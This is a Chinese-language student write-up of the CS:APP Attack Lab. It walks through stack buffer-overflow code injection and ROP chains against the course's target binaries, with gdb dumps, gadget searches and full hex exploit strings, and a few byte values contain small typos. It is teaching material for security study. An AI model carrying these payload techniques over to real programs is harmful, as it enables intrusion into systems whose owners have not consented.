# Part I: Code Injection Attacks

这一部分的讲义中提到程序设定为运行时栈内存的地址不发生变化，因此通过`gdb`可以查看内存，进行数据和代码的注入。

## Level 1

这部分实验主要是学会分析程序，了解代码注入的基本原理。首先我们看一下测试的`test()`代码：

```c
int test() {
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n", val);
}
```

这部分代码表明用一个`getbuf`函数进行读取，而上文已经给出了`getbuf`函数的代码：

```c
unsigned getbuf()
{
    char buf[BUFFER_SIZE];
    Gets(buf);
    return 1;
}
```

其中`Get`函数封装了`get`函数。这里新开了一个大小为`BUFFER_SIZE`大小的char array，将输入的缓存存储在array中，并返回。我们的注入的代码或者数据只能通过这个唯一的输入口来完成，因此需要构造出可以进行攻击的字节序列。由于C的数组并没有边界检查，因此

通过命令反编译得到`ctarget`的汇编代码`ctarget.asm`：

```bash
objdump -d ctarget > ctarget.asm
```

查看汇编程序的`getbuf`函数：

```asm
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq   
  4017be:	90                   	nop
  4017bf:	90                   	nop
```

可以发现这里使用栈来存储char array的内容。完成后将栈顶指针复原并返回。这里的`BUFFER_SZIE`的值为`0x28(=40)`。而栈顶指针复原后即返回函数。我们知道`retq`指令将栈顶存储的地址作为返回值进行跳转。我们希望跳转到`touch1()`，因此就将这个函数的地址`0x4017c0`作为跳转的地址覆盖`test()`函数的返回地址，这样就可以完成跳转。

总的来说，我们将希望跳转的地址写到一个字符序列中，让输入的字符产生越界，覆盖原本的返回地址，跳转到我们期望的地址。由于部分字符无法通过标准输入通过键盘敲出，因此附录A给出了工具`hex2raw`的程序将给定格式的十六进制数转化为对应的源字符。这里注意是从低地址写往高地址，因此返回地址组织为`c0 17 40 00 00 00 00 00`。这样我们就得到了第一个攻击序列，参考`exploit1.txt`：

```txt
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
c0 17 40 00 00 00 00 00
```

通过命令转化为字符后作为标准输入即可：

```bash
root@2e753e36cee9:/csapp/lab/target1# ./hex2raw < exploit1.txt > exploit-raw1.txt
root@2e753e36cee9:/csapp/lab/target1# ./ctarget -q < exploit-raw1.txt
Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00
```

即可顺利完成实验。

## Level 2

这部分实验需要注入x86-64汇编代码的二进制形式，转换方法参考附录B。根据要求，我们需要把代码写到char array中。首先我们需要知道写入的地址，从而完成返回跳转。通过查看内存可以发现，当执行`getbuf()`时，栈顶指针`%rsp`指向的地址为`0x5561dc78`，查看`%rsp -> %rsp + 48`这一段内存：

```bash
(gdb) b *0x4017b4
Breakpoint 5 at 0x4017b4: file buf.c, line 16.
(gdb) r -q
Starting program: /csapp/lab/target1/ctarget -q
Cookie: 0x59b997fa
Type string:asd

Breakpoint 5, getbuf () at buf.c:16
16      in buf.c
(gdb) x /48xb $rsp
0x5561dc78:     0x61    0x73    0x64    0x00    0x00    0x00    0x00    0x00
0x5561dc80:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc88:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc90:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc98:     0x00    0x60    0x58    0x55    0x00    0x00    0x00    0x00
0x5561dca0:     0x76    0x19    0x40    0x00    0x00    0x00    0x00    0x00
```

我们函数的返回地址为`0x401976`，可以发现是返回到`test()`函数。为了正确执行`touch2()`函数且确保我们传入的参数和给定的`cookie`值相同（`0x59b997fa`），我们需要将`%rdi`的值设为cookie的值，之后改变返回地址，让程序执行`ret`指令直接跳转到`touch2()`函数中。

由于实验的讲义建议我们不要使用`jmp`或者`call`指令，因此，我们通过修改`ret`的返回地址来进行跳转。

0. 修改内存`0x5561dc78`处的值为`0x4017ec`
1. 修改返回地址执行我们注入的指令执行的地址(`0x5561dc90`)
2. 修改`%rdi`的值为cookie对应的值
3. 修改`%rsp`指向`0x5561dc78`
4. 返回

对应的汇编语句为
```s
# code2.s
movq  $0x59b997fa, %rdi       
movq  $0x5561dc78, %rsp 
retq
```

使用指令编译并进行反编译

```bash
gcc -c code2.s
objdump -d code2.o > code2.asm
```

在`code2.asm`中即可看到对应的汇编指令。将得到的二进制指令写入到代码注入的内存栈中即可。注入后内存内容如下：

```bash
0x5561dc78:     0xec    0x17    0x40    0x00    0x00    0x00    0x00    0x00
0x5561dc80:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc88:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc90:     0x48    0x17    0x17    0xfa    0x97    0xb9    0x59    0x48
0x5561dc98:     0xc7    0xc4    0x78    0xdc    0x61    0x55    0xc3    0x00
0x5561dca0:     0x90    0xdc    0x61    0x55    0x00    0x00    0x00    0x00
```

## Level 3

先梳理一下这个步骤实现的思路：

第一步，逻辑上需要跳转到touch3函数中

```c
void touch3(char *sval)
{
    vlevel = 3; /* Part of validation protocol */
    if (hexmatch(cookie, sval)) {
        printf("Touch3!: You called touch3(\"%s\")\n", sval);
        validate(3);
    } else {
        printf("Misfire: You called touch3(\"%s\")\n", sval);
        fail(3);
    }
    exit(0);
}
```

可以发现，`touch3()`函数需要传入一个字符串指针，并和cookie一起作为参数调用`hexmatch()`函数。因此我们再探究一下这个函数的内容：

```c
/* Compare string to hex represention of unsigned value */
int hexmatch(unsigned val, char *sval)
{
    char cbuf[110];
    /* Make position of check string unpredictable */
    char *s = cbuf + random() % 100;
    sprintf(s, "%.8x", val);
    return strncmp(sval, s, 9) == 0;
}
```

这个函数将我们的cookie作为val传入，并通过`sprinf()`转化为字符串存储在字符串指针`s`中，并和我们传入的字符串指针进行内容比较。

因此通过倒推可以发现，我们需要把cookie值的字符串形式作为参数传入`touch3()`，作为实验成功的必要条件，在上一部分中已经完成。但是，这一部分调用`hexmatch()`函数后，`%rsp`的值会发生变化，因此需要将cookie的字符串表示值存储在无法被覆盖的内存区域。

因此，我们需要做的工作有：
1. 将注入代码起始地址、字符串、`touch3()`函数的入口地址都存放到内存中
2. 将字符串起始地址写入`%rdi`中
3. 修改`%rsp`的值
4. 调用`retq`指令，跳转到`touch3()`函数，传入字符串的地址进行比较。汇编形式如下：

```asm
# code3.s
movq <ADDR_STR>, %rdi
movq <ADDR_NEW_RSP>, %rsp
retq
```

因此我们组织栈的内容如下：

```bash
0x5561dc78:     0xfa    0x18    0x40    0x00    0x00    0x00    0x00    0x00
0x5561dc80:     0x35    0x39    0x62    0x39    0x39    0x37    0x66    0x61
0x5561dc88:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc90:     0x48    0xc7    0xc7    0x80    0xdc    0x61    0x55    0x48
0x5561dc98:     0xc7    0xc4    0x78    0xdc    0x61    0x55    0xc3    0x00
0x5561dca0:     0x90    0xdc    0x61    0x55    0x00    0x00    0x00    0x00
```

成功通过测试。在`0x401854`处设置断点，运行到断点位置时查看上述内存区域：

```bash
(gdb) x /48xb 0x5561dc78
0x5561dc78:     0x00    0x60    0x58    0x55    0x00    0x00    0x00    0x00
0x5561dc80:     0x35    0x39    0x62    0x39    0x39    0x37    0x66    0x61
0x5561dc88:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc90:     0x48    0xc7    0xc7    0x80    0xdc    0x61    0x55    0x48
0x5561dc98:     0xc7    0xc4    0x78    0xdc    0x61    0x55    0xc3    0x00
0x5561dca0:     0x90    0xdc    0x61    0x55    0x00    0x00    0x00    0x00
```

可以发现由于我们注入的`retq`指令调用后，栈指针向高地址移动后，原来的内容被覆盖了，因此实验讲义的advice提示我们要再三考虑存放cookie字符串的位置。

## Part II: Return-Oriented Programming

这部分实验中增加了难度：

1. 栈采用随机化，因此每次运行时栈的地址是不确定的，无法将PC指向buffer的位置；
2. 栈区的代码是不可执行的，因此即使注入了代码也会出现segmentation fault。

但是实验提供了另一种方案，参考讲义。

## Level 2

这部分实验需要实现Phase2的攻击。讲义的advice中提示栈中需要组织Gadget的地址和数据的混合，因此尽管逻辑上Gadget的地址组成一个链表，但是实际上我们需要把要传入的数据和Gadget地址进行混合。Gadget中可以使用`movq`指令，但是指令源寄存器数据只能由我们自己传入，因此直觉上来说数据应该这样组织：

```
Gadget_1
Data_1
Data_2
...
Data_n
Gadget_2
...
```

这样，先修改`getbuf`函数的返回地址，跳转到Gadget1，执行`popq`将`Data_i`存储到目标寄存器（设置参数），栈顶指针移动，直到指向Gadget2的地址后，gadget1的`retq`指令将PC指向gadget2，再执行gadget2的程序，以此类推。最后把`touch3()`的地址写到最后一个gadget中跳转。

由于Phase2只需要将cookie的数值作为参数传入，结合给定的gadget farm，我们推断出如下指令可以完成任务：

```asm
58          popq %rax
48 89 c7    movq %rax, %rdi
```

此时`Data_1 = ${cookie} = 0x59b997fa`。

中间可能会出现`90`(`nop`指令)，这里忽略掉。通过检索文档可以找到包含`popq %rax`指令字节序列的gadget1：

```asm
00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	retq 
```

`ADDR(gadget1) = 0x4019ab`。同样的可以检索到包含`movq %rax, %rdi`指令字节序列的gadget2：

```asm
00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3                   	retq
```

`ADDR(gadget2) = 0x4019c5`。最后将`touch3()`函数的地址作为gadget3的地址`ADDR(gadget3) = 0x4017ec`。

组织exploit的内容如下：

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
c5 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00
```

## Level 3

这部分实验和Phase3实现的功能相同，也就是在内存中存放cookie的字符序列，之后将字符地址传入`%rdi`中。

和上个实验类似地，我们先考虑指令，再从给定的gadget中搜索字节序列，最后将数据和gadget地址组织起来，编码后进行attack。

首先，cookie的字符串必须存储在栈的高地址，否则可能会被覆盖。而且由于栈的位置是随机化的，只能通过`%rsp`来获取字符串的起始地址。但是这就有一个问题：如果直接将字符串的起始地址用`movq`指令移动，则gadget中并没有`popq`指令的字节序列在此后，这就意味着即使我们能够获取到字符串起始地址，也无法直接使用`movq`指令（因为之后的`retq`指令会弹出一个非法地址）。之后考虑将原本的`retq`指令编码的`0xc3`作为`movl`或`movq`指令的一部分，紧接着下文gadget连续的字节序列执行`popq`但是并没有找到。（于是一宿没睡好）

思来想去，缺少一条`lea`指令，但是讲义中并没有给出，经过检索惊喜地发现竟然有一条`lea`在反汇编得到的代码中：

```asm
00000000004019d6 <add_xy>:
  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4019da:	c3                   	retq
```

因此就可以通过设定偏移量来把字符串的地址传给`%rax`从而传给`%rdi`。偏移量需要后面通过计算得出，这里先用`bias`代替。我们需要通过指令编排来计算`bias`的值：

1. `movq %rsp, %rdi`，将栈顶指针存储到`%rdi`中。
2. `popq %rax`，将偏移地址移动到`%rax`中。
3. `movl %eax, %esi`，此时`%esi`得到的是偏移地址。
4. `lea (%rdi, %rsi, 1), %rax`，将字符串起始地址临时存储到`%rax`中。
5. `movq %rax, %rdi`，将字符串起始地址作为参数传入`%rdi`。
6. 调用`touch3()`函数。

上文只是逻辑上成立的指令序列，实际上并不一定找到一次完成`movq`的字节序列。按照上述的思路来寻找每一个gadget。如果对上面`%rdi`和`%rsi`哪个用来存储栈顶指针和偏移量有疑问可以跳转到后面的**踩坑记录**。

1. 查询指令对应字节序列，没有找到结果，但是找到`movq %rsp, %rax`的字节序列`48 89 e0`：

```asm
0000000000401a03 <addval_190>:
  401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
  401a09:	c3 
```

计算得到`ADDR(gadget1) = 0x401a06`。根据Phase 4，得到`movq %rax, %rdi`的`ADDR(gadget2) = 0x4019c5`。

2. 由Phase 4可知`ADDR(gadget3) = 0x4019ab`。
3. 查询指令对应字节序列，没有找到结果，但是找到`89 c2`和`89 c7`：

```asm
00000000004019db <getval_481>:
  4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax
  4019e0:	c3                   	retq   

00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3       
```

分别对应`movl %eax, %edx`和`movl %eax, %edi`。由于`%rdi`已经存储了原栈顶指针，因此只能匹配`movl %eax, %edx`。计算得到`ADDR(gadget4) = 0x4019dd`。接着查找源寄存器为`%edx`的`movl`指令，匹配到字节序列`89 d1`：

```asm
0000000000401a68 <getval_311>:
  401a68:	b8 89 d1 08 db       	mov    $0xdb08d189,%eax
  401a6d:	c3 
```

对应指令`movl %edx, %ecx`。这里`0b db`为指令`orb %bl`的字节码，计算得到`ADDR(gadget5) = 0x401a69`。接着查找源寄存器为`%ecx`的`movl`指令，匹配到字节序列`89 d1`：

```asm
0000000000401a25 <addval_187>:
  401a25:	8d 87 89 ce 38 c0    	lea    -0x3fc73177(%rdi),%eax
  401a2b:	c3   
```

对应指令`movl %ecx, %esi`。这里`38 c0`为指令`cmpb %al`的字节码，计算得到`ADDR(gadget6) = 0x401a27`。

4. 对应的`ADDR(gadget7) = 0x4019d6`。
5. 由Phase 4可知对应的`ADDR(gadget8) = 0x4019c5`。

因此指令和数据的组织如下：

```asm
movq %rsp, %rax             --> gadget1   --> 0x401a06
<-- 存储的 %rsp 的地址
movq %rax, %rdi             --> gadget2   --> 0x4019c5
popq %rax                   --> gadget3   --> 0x4019ab
[bias]                                    --> 0x48
movl %eax, %edx             --> gadget4   --> 0x4019dd
movl %edx, %ecx             --> gadget5   --> 0x401a69 
movl %ecx, %esi             --> gadget6   --> 0x401a27
lea (%rdi, %rsi, 1), %rax   --> gadget7   --> 0x4019d6
movq %rax, %rdi             --> gadget8   --> 0x4019c5
call touch3                 --> touch3    --> 0x4018fa
<-- cookie字符串起始地址
[cookie]                                  --> 0x616637393962393935
```

每条指令都对应一个`gadget`地址，为8字节。由上表可知偏移量应该为`0x30`，因此`bias = 0x30 = 48`。

这样，就可以将数据组织为十六进制的形式进行exploit：

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00
c5 19 40 00 00 00 00 00
ab 19 40 00 00 00 00 00
48 00 00 00 00 00 00 00
dd 19 40 00 00 00 00 00
69 1a 40 00 00 00 00 00
27 1a 40 00 00 00 00 00
d6 19 40 00 00 00 00 00
c5 19 40 00 00 00 00 00
fa 18 40 00 00 00 00 00
35 39 62 39 39 37 66 61
00 00 00 00 00 00 00 00
```

> **踩坑记录**
> 
> 第一次做的时候未经思考，把偏移地址写到`%rdi`，把栈顶指针写到`%rsi`，导致一直出现segmentation fault。经过思考后，发现`%rsp`的有效数据可能大于4字节（由于随机化和虚拟地址），而如果存储到`%rsi`则只能用`movl`指令传输4字节，会导致栈顶指针数据的高位4字节清零，从而由无效地址触发segmentation fault。后面调整了思路解决了这个问题。
> 
> 其实`lea`命令的格式本身已经给出了提示，将第一个寄存器的值作为基址，第二个寄存器的值作为偏移量。结合上述的两点分析得到结果。

这样就完成了Attack Lab啦。

# 总结

Attack Lab聚焦于x86-64汇编语言和C语言程序，利用缓冲区溢出的特性进行代码植入攻击。

想起高中毕业后填志愿时，尽管对计算机的了解几乎处于文盲水平，但是依然抱着一颗成为黑客的心，选择了软件工程专业。壬寅虎年岁末，也是我大学生涯的尾声，做完Attack Lab，也颇有一种“雄关漫道真如铁，而今迈步从头越”的壮志豪情。最后以一首伟人的词解篇：

> 忆秦娥·娄山关
> 
> 西风烈，长空雁叫霜晨月。霜晨月，马蹄声碎，喇叭声咽。
> 
> 雄关漫道真如铁，而今迈步从头越。从头越，苍山如海，残阳如血。